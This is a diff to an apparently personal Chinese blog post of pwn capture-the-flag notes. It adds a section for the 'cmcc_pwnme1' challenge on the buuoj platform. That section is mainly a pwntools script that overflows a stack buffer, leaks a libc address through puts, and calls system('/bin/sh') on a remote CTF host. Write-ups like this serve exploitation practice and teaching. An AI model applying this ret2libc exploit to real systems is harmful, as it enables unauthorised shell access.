@@ -4,6 +4,8 @@ date: 2019-12-12 11:37:00
 tags: pwn
 top: 3
 ---
+在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题  
+同类型的题只记录一次  
 <!-- more -->
 ## 0x01 rip覆盖一下  
 ```Python
@@ -549,5 +551,49 @@ delete(0)
 #gdb.attach(p)
 p.interactive()
 ```  
-## 0x16  
+## 0x16  cmcc_pwnme1  
+这题未知原因要用LibcSearcher才能打通，加上用了新的模板，故做个记录  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './pwnme1' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",28788)
+elf=ELF(binary)
+libc=ELF("libc6-i386_2.23-0ubuntu10_amd64.so")
+def exp():
+    payload = "a"*168
+    payload += p32(elf.plt['puts']) 
+    payload += p32(elf.sym['main'])
+    payload += p32(elf.got['puts'])
+    p.recvuntil(">> 6. Exit    \n")
+    p.sendline("5")
+    p.recvuntil("fruit:")
+    p.sendline(payload)
+    puts_addr = u32(p.recvuntil("\xf7")[-4:])
+    libc_base = puts_addr - libc.sym['puts']
+    log.success("puts_addr==>" + hex(puts_addr))
+    log.success("libc_base==>" + hex(libc_base))
+    sys_addr = libc_base + libc.sym['system']
+    binsh = libc_base + libc.search("/bin/sh").next()
+    p.recvuntil(">> 6. Exit    \n")
+    p.sendline("5")
+    p.recvuntil("fruit:")
+    one_gadget = libc_base + 0xf02a4
+    payload = "a"*168
+    payload += p32(sys_addr)
+    payload += p32(0xdeadbeef)
+    payload += p32(binsh)
+    p.send(payload)
+    p.interactive()
+exp()
+```  
+## 0x17   
 咕咕咕……  
